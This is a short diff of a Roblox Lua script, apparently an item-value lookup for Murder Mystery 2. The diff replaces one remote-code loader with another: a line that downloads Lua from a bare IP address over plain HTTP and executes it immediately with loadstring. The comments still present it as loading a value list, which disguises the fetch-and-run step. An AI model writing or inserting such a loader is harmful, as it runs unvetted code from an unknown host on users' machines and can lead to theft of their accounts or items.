@@ -59,7 +59,7 @@ local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
 -- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
 local godlyIdx = table.find(rarityTable, "Godly") or 6
-local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/sparkscriptss/S/refs/heads/main/mm2_value.lua"))() or {}
+local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {}
 
 local function lookupValue(realName, itemType, rarity, chroma, year)
     local D = rarity
